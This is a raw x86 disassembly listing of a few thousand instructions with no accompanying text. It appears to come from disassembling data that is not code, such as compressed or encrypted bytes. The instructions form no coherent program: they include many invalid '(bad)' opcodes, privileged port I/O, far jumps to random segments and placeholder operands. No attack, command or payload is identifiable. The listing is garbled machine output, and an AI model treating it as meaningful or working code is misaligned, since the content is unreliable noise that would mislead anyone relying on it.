  41715f:	shl    BYTE PTR [eax+ecx*1+0x6],0xfb
  417164:	and    dl,BYTE PTR [edi-0x48633b9a]
  41716a:	mov    cl,0xc
  41716c:	add    ebp,DWORD PTR [ebx-0x64]
  41716f:	pop    ebp
  417170:	jo     0x417138
  417172:	pop    ebx
  417173:	xchg   edi,eax
  417174:	(bad)  
  417175:	push   cs
  417176:	sub    al,0xad
  417178:	xor    eax,0xc0037ad2
  41717d:	mov    ah,0x38
  41717f:	and    cl,BYTE PTR [esi-0x77]
  417182:	adc    al,0x9b
  417184:	sbb    BYTE PTR [ebp-0x63bdb04b],bl
  41718a:	and    ebx,DWORD PTR [edi]
  41718c:	fild   WORD PTR gs:[eax+0x2c]
  417190:	sub    eax,edi
  417192:	ja     0x417138
  417194:	out    0x18,eax
  417196:	(bad)  
  417197:	and    dl,BYTE PTR [eax+0x4]
  41719a:	aas    
  41719b:	push   ebx
  41719c:	and    al,0x0
  41719e:	imul   esi
  4171a0:	mov    eax,0xa5868c93
  4171a5:	in     al,dx
  4171a6:	jl     0x4171dc
  4171a8:	lahf   
  4171a9:	cld    
  4171aa:	icebp  
  4171ab:	xor    BYTE PTR ds:0xe2c546e9,bh
  4171b1:	or     al,0x82
  4171b3:	cmp    BYTE PTR [esi-0x38],dl
  4171b6:	mov    edx,0x93548046
  4171bb:	cli    
  4171bc:	add    edx,DWORD PTR [esi+0x44]
  4171bf:	xchg   ecx,eax
  4171c0:	jnp    0x417170
  4171c2:	mov    ds:0xc0a5e63d,eax
  4171c7:	ss pop esp
  4171c9:	mov    ah,cl
  4171cb:	dec    ecx
  4171cc:	pop    esp
  4171cd:	inc    ebx
  4171ce:	mov    al,ch
  4171d0:	mov    dl,0xc
  4171d2:	retf   0xffa2
  4171d5:	icebp  
  4171d6:	shl    DWORD PTR [ebx-0x4c0172b],0x52
  4171dd:	lds    edi,FWORD PTR [esi+0x58df3160]
  4171e3:	sbb    al,0x98
  4171e5:	mov    cl,0xa4
  4171e7:	inc    ebp
  4171e8:	ins    BYTE PTR es:[edi],dx
  4171e9:	inc    esp
  4171ea:	pop    esp
  4171eb:	sub    BYTE PTR [esi],0x4
  4171ee:	in     eax,0x99
  4171f0:	outs   dx,DWORD PTR ds:[esi]
  4171f1:	aas    
  4171f2:	mov    ebx,0x563efe39
  4171f7:	mov    esi,0x8d372534
  4171fc:	xchg   esp,eax
  4171fd:	retf   
  4171fe:	push   0x877f4c39
  417203:	push   esp
  417204:	gs mov bh,0xe4
  417207:	xor    al,0x68
  417209:	cmp    ecx,ebx
  41720b:	xor    eax,0x92c4282d
  417210:	dec    eax
  417211:	push   0x4b03f4e0
  417216:	daa    
  417217:	fisttp WORD PTR [ebp-0x6a00c842]
  41721d:	push   ebp
  41721e:	adc    BYTE PTR [edx],ch
  417220:	mov    dl,0x92
  417222:	fcomp  QWORD PTR [esi+0x79]
  417225:	call   0x1cf6190c
  41722a:	fmul   QWORD PTR [esi-0x69]
  41722d:	pop    ss
  41722e:	xlat   BYTE PTR ds:[ebx]
  41722f:	ret    
  417230:	and    edi,DWORD PTR [ecx]
  417232:	retf   0x1c57
  417235:	lods   al,BYTE PTR ds:[esi]
  417236:	or     edi,DWORD PTR [ebp+0x67c340e3]
  41723c:	adc    eax,0xd8cc4e2c
  417241:	cmp    eax,0xca8d1dfc
  417246:	test   dl,bl
  417248:	xchg   ebp,eax
  417249:	ins    DWORD PTR es:[edi],dx
  41724a:	(bad)  
  41724b:	aaa    
  41724c:	xchg   edi,eax
  41724d:	mov    bh,0xa5
  41724f:	(bad)  
  417250:	xchg   esi,eax
  417251:	and    DWORD PTR [edi+ecx*8-0x17fdda3a],edi
  417258:	dec    esi
  417259:	fcom   QWORD PTR [esi]
  41725b:	xchg   esi,eax
  41725c:	adc    BYTE PTR [eax-0x71214b34],0xe4
  417263:	out    0xc4,al
  417265:	and    BYTE PTR [esi-0x32223e0],ch
  41726b:	mov    ecx,0x94d77854
  417270:	jmp    0x969f:0x8583857f
  417277:	add    ah,ah
  417279:	pop    esp
  41727a:	aaa    
  41727b:	out    0xa4,al
  41727d:	mov    ebp,0x68341271
  417282:	loop   0x4172a1
  417284:	and    eax,0xdd732759
  417289:	mov    esp,0x183ff95b
  41728e:	fsub   QWORD PTR [ebp-0x50]
  417291:	cmp    BYTE PTR [esi+0x676e568d],ch
  417297:	enter  0xbf2b,0xed
  41729b:	mov    eax,0xff8b228a
  4172a0:	mov    ch,0xf2
  4172a2:	lods   eax,DWORD PTR ds:[esi]
  4172a3:	leave  
  4172a4:	ret    
  4172a5:	dec    ebp
  4172a6:	aam    0xc4
  4172a8:	and    BYTE PTR [edx+0x5b41dfb7],bh
  4172ae:	call   0x39cacb0d
  4172b3:	xchg   ecx,eax
  4172b4:	icebp  
  4172b5:	sub    edi,esp
  4172b7:	aaa    
  4172b8:	imul   edi,ecx,0x34
  4172bb:	jnp    0x417301
  4172bd:	sahf   
  4172be:	push   edi
  4172bf:	sub    eax,0x39c30000
  4172c4:	mov    ss,WORD PTR [eax+0x5f]
  4172c7:	cmp    DWORD PTR [edi],0x3d1458fa
  4172cd:	sub    esi,esi
  4172cf:	dec    edi
  4172d0:	xchg   DWORD PTR [ecx],ecx
  4172d2:	pusha  
  4172d3:	mov    ebp,0xd57ff223
  4172d8:	push   eax
  4172d9:	dec    ebx
  4172da:	cmp    edi,DWORD PTR [edx-0x343fb281]
  4172e0:	call   0xdec20ab
  4172e5:	push   esi
  4172e6:	jle    0x417366
  4172e8:	loope  0x4172c6
  4172ea:	pushf  
  4172eb:	rcl    DWORD PTR [ebx-0x4d1ed815],1
  4172f1:	or     al,BYTE PTR [ebx+ecx*1-0x5]
  4172f5:	cmp    BYTE PTR [ebp-0x626fdfee],dl
  4172fb:	pop    es
  4172fc:	pushf  
  4172fd:	adc    BYTE PTR ds:0x2bf55f81,bl
  417303:	sahf   
  417304:	jecxz  0x417380
  417306:	sbb    BYTE PTR [eax],dl
  417308:	dec    ebp
  417309:	or     BYTE PTR [esi],dh
  41730b:	add    ch,dl
  41730d:	retf   
  41730e:	and    edi,edx
  417310:	(bad)  
  417311:	xchg   ebx,eax
  417312:	data16 and al,0xd8
  417315:	adc    DWORD PTR [ecx+0x4caa423c],ebp
  41731b:	ret    0x37d5
  41731e:	mov    BYTE PTR [edx+0x21],ch
  417321:	js     0x417360
  417323:	dec    ecx
  417324:	call   0x794837c0
  417329:	push   ds
  41732a:	sub    DWORD PTR [esi-0x443dff5b],ebp
  417330:	mov    ebx,0x392fb263
  417335:	xchg   ebx,eax
  417336:	push   es
  417337:	jge    0x4172e7
  417339:	sbb    al,0x1e
  41733b:	sbb    DWORD PTR [edx],ecx
  41733d:	jb     0x41732b
  41733f:	xor    DWORD PTR [edi+ecx*4-0x79],ebx
  417343:	jl     0x4173a4
  417345:	sub    al,0x73
  417347:	mov    bl,0xb4
  417349:	xchg   dh,bh
  41734b:	pop    edi
  41734c:	mov    dl,0xf3
  41734e:	outs   dx,DWORD PTR ds:[esi]
  41734f:	ja     0x417304
  417351:	test   DWORD PTR [ebp-0x7a],ecx
  417354:	test   al,0x4
  417356:	cld    
  417357:	jp     0x4172f7
  417359:	jmp    0xe2d3:0x9388a654
  417360:	js     0x417360
  417362:	sub    eax,0xb1ded9d2
  417367:	out    dx,al
  417368:	or     DWORD PTR [edi+0x21],ebx
  41736b:	jle    0x4173c2
  41736d:	(bad)  
  41736e:	scas   eax,DWORD PTR es:[edi]
  41736f:	test   BYTE PTR [ecx-0x526b2f74],ch
  417375:	sbb    ecx,eax
  417377:	xor    DWORD PTR [ebp+0x67],ebx
  41737a:	cmp    dh,0x83
  41737d:	std    
  41737e:	mov    esi,0x4db85848
  417383:	mov    WORD PTR [ecx+0x45],?
  417386:	pop    es
  417387:	jmp    0xaa14fd63
  41738c:	mov    ch,0x3f
  41738e:	jl     0x4173b8
  417390:	(bad)  
  417391:	stos   BYTE PTR es:[edi],al
  417392:	add    ah,BYTE PTR [esi+0x5c]
  417395:	and    bl,bl
  417397:	pop    ds
  417398:	(bad)  
  417399:	ficom  WORD PTR [eax+0x1140b02a]
  41739f:	stos   DWORD PTR es:[edi],eax
  4173a0:	xchg   edx,eax
  4173a1:	call   0x701e:0xf6cb1559
  4173a8:	jnp    0x4173a2
  4173aa:	push   ebx
  4173ab:	in     al,0x2b
  4173ad:	xor    ch,cl
  4173af:	or     al,0xfb
  4173b1:	lock push es
  4173b3:	pop    ecx
  4173b4:	or     eax,0xc4b301f8
  4173b9:	mov    ah,0x68
  4173bb:	loope  0x41738b
  4173bd:	call   0xcdb2f53
  4173c2:	push   ss
  4173c3:	aaa    
  4173c4:	push   edi
  4173c5:	pop    eax
  4173c6:	in     eax,0x20
  4173c8:	int3   
  4173c9:	sub    eax,0xc24519a5
  4173ce:	gs jae 0x41735c
  4173d1:	xchg   esi,eax
  4173d2:	loopne 0x417416
  4173d4:	int3   
  4173d5:	xchg   BYTE PTR [edi+0x4aa6155],ah
  4173db:	sar    DWORD PTR [edx+0x50],cl
  4173de:	cmp    ecx,DWORD PTR [ebx]
  4173e0:	scas   al,BYTE PTR es:[edi]
  4173e1:	out    0x4f,eax
  4173e3:	mov    WORD PTR [ebx+0x17],ss
  4173e6:	xchg   DWORD PTR [edx+ecx*8],ecx
  4173e9:	sub    esi,eax
  4173eb:	or     edx,ecx
  4173ed:	hlt    
  4173ee:	ret    0x2e5c
  4173f1:	(bad)  
  4173f2:	in     al,dx
  4173f3:	pop    ss
  4173f4:	pop    esp
  4173f5:	pop    esp
  4173f6:	mov    ah,0xee
  4173f8:	shr    DWORD PTR [ebx-0x4f8fd5],cl
  4173fe:	xchg   ecx,eax
  4173ff:	aad    0xf2
  417401:	stos   DWORD PTR es:[edi],eax
  417402:	xor    eax,0xe9078506
  417407:	hlt    
  417408:	mov    DWORD PTR [ebx],eax
  41740a:	or     al,0x59
  41740c:	gs pop ebp
  41740e:	pop    esi
  41740f:	dec    ecx
  417410:	mov    ebp,?
  417412:	mov    edi,0x3b9cdd84
  417417:	mov    edx,0x2926eb4e
  41741c:	push   edi
  41741d:	pop    edx
  41741e:	enter  0xde51,0xba
  417422:	push   ebx
  417423:	push   ebp
  417424:	aaa    
  417425:	je     0x41740e
  417427:	or     BYTE PTR [edi],cl
  417429:	jbe    0x4173fa
  41742b:	ds jb  0x417462
  41742e:	jae    0x417438
  417430:	(bad)  
  417431:	xchg   dx,ax
  417433:	inc    ecx
  417434:	adc    ecx,ebx
  417436:	test   eax,0x3862b4c4
  41743b:	pop    ebp
  41743c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41743d:	pop    ecx
  41743e:	adc    al,0x6c
  417440:	mov    edx,0xabfce065
  417445:	push   ds
  417446:	mov    ecx,edx
  417448:	ja     0x4173e2
  41744a:	bound  eax,QWORD PTR [edi+edi*2-0x7c]
  41744e:	popw   es
  417450:	scas   al,BYTE PTR es:[edi]
  417451:	inc    edx
  417452:	cwde   
  417453:	jb     0x41741f
  417455:	push   ebp
  417456:	or     DWORD PTR [ecx],edx
  417458:	xchg   edx,eax
  417459:	out    dx,eax
  41745a:	sbb    eax,0x5d812764
  41745f:	(bad)
  417463:	das    
  417464:	xor    al,0xe1
  417466:	scas   eax,DWORD PTR es:[edi]
  417467:	das    
  417468:	dec    esi
  417469:	adc    BYTE PTR [ebp-0x7],bl
  41746c:	in     al,dx
  41746d:	mov    ah,0x73
  41746f:	ret    
  417470:	imul   esi,DWORD PTR ds:0x1f7aed3f,0x29bb2c82
  41747a:	fmul   st,st(4)
  41747c:	pop    ecx
  41747d:	jnp    0x41748e
  41747f:	cmp    DWORD PTR [eax-0x72fd3dfd],esp
  417485:	jmp    0xe62c05c5
  41748a:	jl     0x417435
  41748c:	jmp    0x635:0x46192847
  417493:	loop   0x4174c8
  417495:	std    
  417496:	retf   
  417497:	std    
  417498:	dec    eax
  417499:	mov    cl,0x51
  41749b:	mov    bl,0xc5
  41749d:	and    BYTE PTR [ecx-0x5263c0da],bl
  4174a3:	ror    DWORD PTR [ebx-0x5fec1c61],cl
  4174a9:	js     0x4174c0
  4174ab:	sbb    al,BYTE PTR [ecx-0x3b8e08a]
  4174b1:	das    
  4174b2:	mov    dh,ch
  4174b4:	mov    edx,DWORD PTR [ecx+0x33d59f12]
  4174ba:	repz rcl DWORD PTR [esi-0x64b9164f],1
  4174c1:	mov    DWORD PTR [eax],eax
  4174c3:	(bad)  
  4174c5:	sbb    al,BYTE PTR [edx-0x709d9722]
  4174cb:	and    eax,0x79cf9332
  4174d0:	int3   
  4174d1:	mov    bl,0x70
  4174d3:	in     eax,dx
  4174d4:	xchg   bl,bl
  4174d6:	mov    bh,0x78
  4174d8:	xchg   edx,eax
  4174d9:	iret   
  4174da:	shr    ebp,cl
  4174dc:	pop    ecx
  4174dd:	std    
  4174de:	call   0x5ef6:0x1f4193ea
  4174e5:	imul   edx,DWORD PTR [eax+ecx*2],0xfffffffb
  4174e9:	inc    ebp
  4174ea:	in     eax,0xb
  4174ec:	cmp    ebp,DWORD PTR [esi+ecx*4]
  4174ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174f0:	iret   
  4174f1:	xor    ecx,ebp
  4174f3:	mov    eax,ds:0xe2158a57
  4174f8:	cli    
  4174f9:	jmp    0x27375370
  4174fe:	std    
  4174ff:	jmp    0x32433c29
  417504:	in     eax,0x2
  417506:	jnp    0x4174ae
  417508:	xchg   edi,eax
  417509:	sub    al,0x10
  41750b:	inc    edx
  41750c:	inc    ebp
  41750d:	xlat   BYTE PTR ds:[ebx]
  41750e:	xchg   DWORD PTR [edx-0x6923bd39],ecx
  417514:	loop   0x41751b
  417516:	fstp   TBYTE PTR [esi]
  417518:	jns    0x4174a0
  41751a:	jmp    0x2001:0x4a77f482
  417521:	int3   
  417522:	add    ecx,esi
  417524:	adc    bh,0xfc
  417527:	mov    eax,ds:0xd034114
  41752c:	or     al,0x2c
  41752e:	xchg   ebx,eax
  41752f:	fldcw  WORD PTR [esi]
  417531:	sub    eax,0x77a56223
  417536:	in     eax,0x5d
  417538:	mov    edx,0x801f1054
  41753d:	enter  0x478e,0x56
  417541:	mov    al,ds:0xa74339ef
  417546:	jns    0x417554
  417548:	lods   eax,DWORD PTR ds:[esi]
  417549:	in     al,0x67
  41754b:	shl    BYTE PTR [esi],1
  41754d:	mov    eax,0xe3c5c2b8
  417552:	add    ah,dh
  417554:	sti    
  417555:	dec    eax
  417556:	nop
  417557:	mov    edi,0x26afb6b0
  41755c:	or     DWORD PTR [esi],esp
  41755e:	push   esp
  41755f:	lods   al,BYTE PTR ds:[esi]
  417560:	rcr    BYTE PTR [esi],0xfe
  417563:	pusha  
  417564:	pop    ss
  417565:	xchg   esp,esp
  417567:	call   0xbc95:0xfc755ecb
  41756e:	in     al,dx
  41756f:	stc    
  417570:	jb     0x417518
  417572:	loop   0x41751e
  417574:	push   esp
  417575:	lahf   
  417576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417577:	mov    ah,0x8c
  417579:	push   es
  41757a:	gs stos BYTE PTR es:[edi],al
  41757c:	mov    edx,0xd3a1576b
  417581:	js     0x417534
  417583:	(bad)  
  417584:	out    dx,eax
  417585:	ret    0x2ca1
  417588:	call   0xf103:0x3ea7a901
  41758f:	pop    eax
  417590:	mov    ds:0xee986c93,eax
  417595:	push   ds
  417596:	rcr    BYTE PTR [ebp+0x284e18ea],cl
  41759c:	sub    ch,BYTE PTR [edi+0x65]
  41759f:	arpl   WORD PTR [ecx],cx
  4175a1:	fdivr  DWORD PTR [edx+0x55850af2]
  4175a7:	xchg   ebp,eax
  4175a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175a9:	cwde   
  4175aa:	or     edi,0xe4a9ebcf
  4175b0:	and    al,0xa2
  4175b2:	pop    esi
  4175b3:	iret   
  4175b4:	sbb    BYTE PTR [ebp+eax*2+0x31474ab2],ah
  4175bb:	sub    al,BYTE PTR [edi+0x5759c904]
  4175c1:	ror    DWORD PTR [edx+0x2d866bce],1
  4175c7:	push   ss
  4175c8:	arpl   dx,si
  4175ca:	xchg   esi,eax
  4175cb:	fild   QWORD PTR [edi]
  4175cd:	cmp    dl,BYTE PTR [ebp+0x1d763458]
  4175d3:	inc    ebx
  4175d4:	aas    
  4175d5:	ret    0x9bff
  4175d8:	add    BYTE PTR [ebx],0x28
  4175db:	mov    esi,cs
  4175dd:	test   BYTE PTR [esi-0x46],bl
  4175e0:	xchg   DWORD PTR [esi-0x21],ebp
  4175e3:	jp     0x41758c
  4175e5:	pop    DWORD PTR [ecx+ecx*4-0xc063fb7]
  4175ec:	inc    ebx
  4175ed:	loope  0x4175bb
  4175ef:	das    
  4175f0:	jmp    0x3d3:0x682824aa
  4175f7:	add    al,0x5b
  4175f9:	jp     0x4175fe
  4175fb:	dec    eax
  4175fc:	popf   
  4175fd:	mov    cl,0xa0
  4175ff:	or     ebp,DWORD PTR [ecx]
  417601:	movq   QWORD PTR [edx+0x54],mm6
  417605:	or     dh,BYTE PTR [ebx-0x19]
  417608:	adc    BYTE PTR [ecx-0x5d080106],cl
  41760e:	cmp    bh,BYTE PTR [eax+0x3c]
  417611:	push   esp
  417612:	imul   esi,DWORD PTR [ecx+0x40a96a51],0xffffffa1
  417619:	ins    DWORD PTR es:[di],dx
  41761b:	adc    BYTE PTR [ecx+edi*4+0x4e],dl
  41761f:	adc    ebp,ebx
  417621:	dec    edi
  417622:	iret   
  417623:	bound  ebp,QWORD PTR [esp+ebp*1+0x25]
  417627:	clc    
  417628:	dec    ebp
  417629:	out    0x44,al
  41762b:	and    cl,0xc2
  41762e:	dec    ecx
  41762f:	repnz fisub DWORD PTR [edi-0x24]
  417633:	lea    eax,[edi]
  417635:	cmp    al,0xad
  417637:	mov    al,0x34
  417639:	mov    al,ds:0x42a7a673
  41763e:	popf   
  41763f:	adc    ah,0x2e
  417642:	cdq    
  417643:	inc    esp
  417644:	lds    esp,FWORD PTR [edx-0x35fd23b0]
  41764a:	sub    BYTE PTR [esi],bl
  41764c:	lahf   
  41764d:	dec    ebx
  41764e:	pop    ecx
  41764f:	push   edx
  417650:	xor    bl,BYTE PTR ds:0x17b27ef2
  417656:	pushf  
  417657:	lds    esp,FWORD PTR [esi]
  417659:	pop    ds
  41765a:	test   DWORD PTR [ebx],edi
  41765c:	mov    ecx,0xd4fbdaf8
  417661:	pushf  
  417662:	in     eax,dx
  417663:	pop    ebx
  417664:	adc    ebp,DWORD PTR [esi+0x14fecb91]
  41766a:	sub    al,0x6b
  41766c:	into   
  41766d:	test   eax,0x2d3eae45
  417672:	sbb    al,cl
  417674:	fistp  QWORD PTR [edx]
  417676:	(bad)  
  417677:	fadd   QWORD PTR [edi+0x43f6c516]
  41767d:	nop
  41767e:	pop    edi
  41767f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417680:	fst    st(7)
  417682:	push   ebx
  417683:	sub    DWORD PTR [edx-0x7e],edi
  417686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417687:	lods   al,BYTE PTR ds:[esi]
  417688:	inc    esp
  417689:	mov    WORD PTR [ecx],?
  41768b:	mov    edi,0xbad268d7
  417690:	cmp    al,BYTE PTR [ebx]
  417692:	mov    bh,0xbd
  417694:	pop    ss
  417695:	test   al,0x2
  417697:	in     eax,0xab
  417699:	pop    ds
  41769a:	mov    cl,0xb6
  41769c:	repz dec esp
  41769e:	and    eax,0x131be5fa
  4176a3:	lea    ebx,[ecx-0x4c]
  4176a6:	dec    esi
  4176a7:	in     al,dx
  4176a8:	inc    esi
  4176a9:	es pusha 
  4176ab:	push   edx
  4176ac:	jne    0x4176b6
  4176ae:	or     al,0x40
  4176b0:	dec    esi
  4176b1:	add    DWORD PTR [eax+0x682bf70d],esp
  4176b7:	test   eax,0x5767585c
  4176bc:	aas    
  4176bd:	pusha  
  4176be:	test   ch,bl
  4176c0:	and    BYTE PTR [ecx+0x15464d34],0x20
  4176c7:	mov    eax,ds:0x263e5a0f
  4176cc:	int    0xce
  4176ce:	scas   eax,DWORD PTR es:[edi]
  4176cf:	jg     0x4176d4
  4176d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176d2:	sbb    DWORD PTR [edi+0x1a91714b],ebx
  4176d8:	sti    
  4176d9:	or     BYTE PTR [ebx-0x5a],bh
  4176dc:	cmp    al,0x53
  4176de:	jbe    0x4176fc
  4176e0:	inc    edi
  4176e1:	fdivr  st,st(2)
  4176e3:	dec    ebx
  4176e4:	xor    BYTE PTR [ebp-0x1a],cl
  4176e7:	cmp    eax,0x2008fad5
  4176ec:	add    al,0xc1
  4176ee:	test   eax,0xbeaf23f6
  4176f3:	jnp    0x41776f
  4176f5:	jne    0x417686
  4176f7:	pushf  
  4176f8:	push   cs
  4176f9:	shr    dh,1
  4176fb:	jp     0x4176af
  4176fd:	jno    0x4176b5
  4176ff:	jmp    0xec69:0x2a935af2
  417706:	and    BYTE PTR [edi],al
  417708:	test   BYTE PTR [edi-0x3b3aaaae],al
  41770e:	sti    
  41770f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417710:	push   ds
  417711:	and    al,0xd2
  417713:	dec    esi
  417714:	cmp    al,0x74
  417716:	jg     0x4176cf
  417718:	loop   0x417735
  41771a:	sti    
  41771b:	sar    BYTE PTR [edx],cl
  41771d:	and    ch,al
  41771f:	sahf   
  417720:	push   cs
  417721:	nop
  417722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417723:	jmp    0xe86a:0x320fec7c
  41772a:	jl     0x417741
  41772c:	jns    0x417769
  41772e:	xor    ebx,DWORD PTR cs:[ebx]
  417731:	jb     0x877d878c
  417737:	xchg   esi,eax
  417738:	and    BYTE PTR ds:0x79ad0a9,dh
  41773e:	adc    DWORD PTR [ebp+0x36],esp
  417741:	mov    eax,0xd8fa53ef
  417746:	jg     0x417797
  417748:	dec    eax
  417749:	outs   dx,DWORD PTR ds:[esi]
  41774a:	jmp    0x4177b9
  41774c:	cdq    
  41774d:	mov    DWORD PTR [edi],eax
  41774f:	sub    ch,ah
  417751:	sbb    DWORD PTR [edi+ebp*1],esi
  417754:	jg     0x41773e
  417756:	add    eax,0xddc8bb27
  41775b:	es inc ebp
  41775d:	adc    ecx,DWORD PTR [ecx+eiz*2]
  417760:	ins    DWORD PTR es:[edi],dx
  417761:	mov    eax,ds:0xddebf4e1
  417766:	mov    dl,0xdf
  417768:	call   0x9cf50e3e
  41776d:	sbb    al,0x22
  41776f:	and    edx,0xe1cacb39
  417775:	jmp    0x41772f
  417777:	cmc    
  417778:	out    0xd6,eax
  41777a:	adc    ecx,DWORD PTR [ecx-0x16fc824c]
  417780:	inc    edi
  417781:	js     0x4177f5
  417783:	and    BYTE PTR [ebx],dh
  417785:	(bad)  
  417787:	jno    0x4177e2
  417789:	lea    esp,[ebx-0x38]
  41778c:	into   
  41778d:	arpl   cx,ax
  41778f:	addr16 into 
  417791:	repz fs dec esi
  417794:	in     eax,dx
  417795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417796:	mov    eax,DWORD PTR ds:0x2b62cc8b
  41779c:	mov    cl,0x37
  41779e:	push   ebx
  41779f:	cmp    eax,0xb55e2f03
  4177a4:	daa    
  4177a5:	mov    bl,0x5d
  4177a7:	jae    0x4177c2
  4177a9:	lds    esi,FWORD PTR [esi+0x46]
  4177ac:	ss scas al,BYTE PTR es:[edi]
  4177ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177af:	ret    
  4177b0:	test   al,0x17
  4177b2:	js     0x4177d1
  4177b4:	xor    al,BYTE PTR [esi-0x1dcef9d2]
  4177ba:	pop    ebp
  4177bb:	jmp    0x5448fb4b
  4177c0:	out    dx,eax
  4177c1:	fidivr WORD PTR [edi-0x53]
  4177c4:	jno    0x4177d1
  4177c6:	mov    ebp,0x900872aa
  4177cb:	mov    WORD PTR [edi],?
  4177cd:	sub    al,0x36
  4177cf:	sub    al,0xc7
  4177d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177d2:	icebp  
  4177d3:	dec    edx
  4177d4:	dec    eax
  4177d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177d6:	sub    BYTE PTR [ecx-0x37f32016],cl
  4177dc:	repz leave 
  4177de:	stos   BYTE PTR es:[edi],al
  4177df:	cdq    
  4177e0:	pop    ebx
  4177e1:	sbb    dl,BYTE PTR [esi+edx*4-0x69028ca1]
  4177e8:	jg     0x41781a
  4177ea:	jns    0x417790
  4177ec:	pushf  
  4177ed:	cmp    al,0x34
  4177ef:	or     dl,bh
  4177f1:	cs (bad) 
  4177f3:	(bad)  
  4177f4:	xchg   esp,eax
  4177f5:	xchg   ebp,eax
  4177f6:	fldenv [edi]
  4177f8:	pop    ebx
  4177f9:	and    al,0xa2
  4177fb:	pop    ecx
  4177fc:	mov    bl,0x4
  4177fe:	lea    ebx,[ebx-0x201a157]
  417804:	xor    al,BYTE PTR [ecx]
  417806:	add    eax,0x36942a87
  41780b:	jge    0x41787a
  41780d:	cmp    BYTE PTR [edx-0x5571000],dh
  417813:	(bad)  
  417814:	xchg   BYTE PTR [edx-0xe],cl
  417817:	mov    DWORD PTR [ebp-0x4d],ebx
  41781a:	jne    0x41779e
  41781c:	cs or  al,0xfb
  41781f:	fistp  DWORD PTR [eax+edi*1-0xf0b7652]
  417826:	mov    ebx,0xbb7d173b
  41782b:	inc    eax
  41782c:	mov    eax,0x1c7cdac3
  417831:	jp     0x417826
  417833:	cmp    BYTE PTR [eax-0x3e1ec2a8],ch
  417839:	and    al,0x36
  41783b:	sbb    ah,BYTE PTR [eax]
  41783d:	mov    bh,0xb8
  41783f:	mov    ds:0x12079ba0,al
  417844:	dec    edx
  417845:	add    BYTE PTR [eax+0x54],dl
  417848:	std    
  417849:	mov    ebp,0x9d4f2177
  41784e:	fsub   DWORD PTR [edi-0x78e9c812]
  417854:	ret    
  417855:	jmp    0x61149b32
  41785a:	loopne 0x4177e7
  41785c:	ret    
  41785d:	(bad)  [esi-0x77]
  417860:	mov    ebp,0x1ddc0c52
  417865:	or     eax,0x1e59c117
  41786a:	pop    esp
  41786b:	and    eax,0xc1dcbfa8
  417870:	lods   eax,DWORD PTR ds:[esi]
  417871:	jmp    0xf82d:0xdb0661bb
  417878:	xchg   edi,eax
  417879:	std    
  41787a:	or     al,0xa9
  41787c:	or     ecx,esi
  41787e:	pop    esi
  41787f:	aad    0x6a
  417881:	mov    bh,0x9a
  417883:	iret   
  417884:	dec    cx
  417886:	push   ebp
  417887:	dec    esi
  417888:	gs xor ecx,ebx
  41788b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41788c:	xchg   DWORD PTR [ecx+0x5bbfcf03],eax
  417892:	add    ch,BYTE PTR [ecx]
  417894:	sub    al,0x15
  417896:	jne    0x4178ae
  417898:	dec    eax
  417899:	push   es
  41789a:	mov    al,ds:0x1b257dc7
  41789f:	mov    DWORD PTR [ecx+0x7521f6f5],esi
  4178a5:	repnz clc 
  4178a7:	pop    edx
  4178a8:	mov    ?,WORD PTR [edi+0x72]
  4178ab:	fist   DWORD PTR [edx+edx*8-0x10]
  4178af:	jbe    0x4178ba
  4178b1:	sub    al,0x31
  4178b3:	mov    edx,0xf5679d0b
  4178b8:	bound  edx,QWORD PTR [ebx]
  4178ba:	mov    dh,0xb1
  4178bc:	adc    ch,BYTE PTR [edi+ebx*8-0xe]
  4178c0:	popf   
  4178c1:	mov    ebp,DWORD PTR [edx+edx*4]
  4178c4:	sar    esp,0xfa
  4178c7:	inc    esp
  4178c8:	jge    0x41791b
  4178ca:	pop    esp
  4178cb:	mov    ah,0x65
  4178cd:	add    eax,0x43197a1c
  4178d2:	test   eax,0x8192bc73
  4178d7:	jnp    0x4178ad
  4178d9:	stc    
  4178da:	xchg   edx,eax
  4178db:	inc    eax
  4178dc:	(bad)  
  4178dd:	adc    ah,BYTE PTR [ebx-0x4d]
  4178e0:	fcmovne st,st(5)
  4178e2:	push   es
  4178e3:	adc    BYTE PTR [ebx],bl
  4178e5:	sbb    eax,0x7fc1dda
  4178ea:	dec    esp
  4178eb:	les    edi,FWORD PTR [ebx-0x36]
  4178ee:	xor    dl,BYTE PTR [eax]
  4178f0:	cmp    BYTE PTR [esi+0x348d2860],0xe8
  4178f7:	add    eax,0x715ced0c
  4178fc:	std    
  4178fd:	dec    esi
  4178fe:	nop
  4178ff:	loopne 0x417953
  417901:	bound  ecx,QWORD PTR ds:0x5c3f8c64
  417907:	cmc    
  417908:	les    esi,FWORD PTR [eax-0x5bc67bfb]
  41790e:	and    ch,bh
  417910:	repnz and DWORD PTR [ecx-0x12a2ccfa],ebp
  417917:	adc    BYTE PTR [ecx],al
  417919:	je     0x4178a4
  41791b:	in     al,dx
  41791c:	in     al,dx
  41791d:	pop    ds
  41791e:	in     al,dx
  41791f:	dec    ebp
  417920:	sub    edi,ecx
  417922:	data16 ins BYTE PTR es:[edi],dx
  417924:	shl    BYTE PTR [ebp-0x296e7996],0x30
  41792b:	sbb    ebp,DWORD PTR [esi+edi*4]
  41792e:	mov    bh,BYTE PTR [ebx+0x0]
  417931:	test   DWORD PTR [edi+edx*8+0x34],edi
  417935:	pop    DWORD PTR ds:0xc6f5a72
  41793b:	addr16 cmp dh,bl
  41793e:	pop    edi
  41793f:	mov    edi,DWORD PTR [ecx+0x7f49e176]
  417945:	fcomp  DWORD PTR [ebx+edx*4]
  417948:	pop    esi
  417949:	mov    DWORD PTR [ecx+ebp*2-0x72fbaf2e],edx
  417950:	scas   al,BYTE PTR es:[edi]
  417951:	push   0xffffffff
  417953:	jle    0x417988
